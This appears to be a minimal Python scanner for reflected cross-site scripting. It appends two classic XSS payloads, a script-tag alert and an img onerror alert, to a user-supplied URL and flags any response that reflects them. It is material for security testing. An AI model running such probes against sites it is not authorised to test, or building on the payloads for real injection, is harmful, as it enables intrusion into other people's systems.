import requests

url = input("Enter URL (e.g., http://example.com/search?q=): ")
payloads = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"]

for payload in payloads:
    test_url = url + payload
    r = requests.get(test_url)
    if payload in r.text:
        print(f"[!] Possible XSS with payload: {payload}")